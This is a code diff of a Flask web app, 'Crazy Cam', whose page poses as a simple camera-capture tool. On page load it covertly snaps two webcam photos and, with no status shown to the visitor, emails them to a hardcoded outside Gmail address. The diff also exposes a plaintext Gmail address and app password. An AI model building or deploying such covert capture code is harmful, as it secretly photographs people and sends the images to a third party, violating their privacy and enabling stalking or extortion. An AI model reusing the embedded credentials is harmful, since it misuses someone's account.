@@ -7,13 +7,14 @@ import threading
 
 app = Flask(__name__)
 
-# Email credentials (App Password)
+# Gmail configuration (App Password mandatory)
 SENDER_EMAIL = "mindmeld025@gmail.com"
-SENDER_PASSWORD = "rvuvgegdqzsgrcsn"  # Gmail App Password
+SENDER_PASSWORD = "rvuvgegdqzsgrcsn"  # Must be App Password
 RECEIVER_EMAIL = "fermahmuda@gmail.com"
 
 
 def send_email(image1, image2):
+    """Send email with 2 images, safely with logging"""
     try:
         msg = EmailMessage()
         msg['Subject'] = 'Captured Images'
@@ -21,9 +22,11 @@ def send_email(image1, image2):
         msg['To'] = RECEIVER_EMAIL
         msg.set_content("Here are the captured images.")
 
-        # Attach full-size images
-        msg.add_attachment(base64.b64decode(image1.split(",")[1]), maintype='image', subtype='png', filename="image1.png")
-        msg.add_attachment(base64.b64decode(image2.split(",")[1]), maintype='image', subtype='png', filename="image2.png")
+        # Decode base64 images and attach
+        msg.add_attachment(base64.b64decode(image1.split(",")[1]),
+                           maintype='image', subtype='png', filename="image1.png")
+        msg.add_attachment(base64.b64decode(image2.split(",")[1]),
+                           maintype='image', subtype='png', filename="image2.png")
 
         context = ssl.create_default_context()
         with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
@@ -31,13 +34,12 @@ def send_email(image1, image2):
             server.send_message(msg)
 
         print("✅ Email sent successfully")
-
     except Exception as e:
-        print("❌ Email Error:", e)
+        print("❌ Email sending failed:", e)
 
 
 def send_email_threaded(image1, image2):
-    """Send email in background to make browser fast"""
+    """Send email in background thread"""
     thread = threading.Thread(target=send_email, args=(image1, image2))
     thread.start()
 
@@ -48,7 +50,7 @@ def index():
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Crazy Cam Auto</title>
+    <title>Crazy Cam Fixed</title>
 </head>
 <body>
     <h2>Camera Capture</h2>
@@ -65,7 +67,6 @@ def index():
         const statusDiv = document.getElementById('status');
         let images = {};
 
-        // Camera access
         navigator.mediaDevices.getUserMedia({ video: true })
         .then(stream => {
             video.srcObject = stream;
@@ -74,33 +75,40 @@ def index():
             statusDiv.innerText = "❌ Camera permission denied!";
         });
 
-        // Wait until camera ready
         video.onloadedmetadata = () => {
-            statusDiv.innerText = "📸 Camera ready... capturing soon";
+            statusDiv.innerText = "📸 Camera ready...";
 
-            setTimeout(() => capture(1), 1500);
-            setTimeout(() => capture(2), 3000);
+            // Capture first image
+            setTimeout(() => capture(1), 1000);
+            // Capture second image and send automatically
+            setTimeout(() => capture(2), 2500);
         };
 
         function capture(num) {
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
+
+            // Optional: reduce size slightly to avoid Gmail timeout
+            // const scale = 0.7;
+            // canvas.width *= scale;
+            // canvas.height *= scale;
+
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            let dataUrl = canvas.toDataURL('image/png');
+            let dataUrl = canvas.toDataURL('image/png');  // full-size PNG
 
             images["image" + num] = dataUrl;
 
-            // Automatic send on second image, no status text
-            if (num === 2) {
+            if(num === 2){
+                // Automatic sending, no status text
                 fetch('/send_images', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify(images)
-                }).catch(err => console.error("❌ Email send error:", err));
+                })
+                .catch(err => console.error("❌ Email send error:", err));
             }
         }
 
-        // Manual capture
         function manualCapture() {
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
@@ -116,7 +124,6 @@ def index():
 
     <h3>Manual Capture</h3>
     <button onclick="manualCapture()">Capture & Download</button>
-
 </body>
 </html>
     """)
@@ -132,10 +139,8 @@ def send_images():
         if not image1 or not image2:
             return jsonify({"status": "error", "message": "Missing images"})
 
-        # Threaded background send
         send_email_threaded(image1, image2)
 
-        # Browser instantly gets response
         return jsonify({"status": "success"})
     except Exception as e:
         print("❌ Route Error:", e)
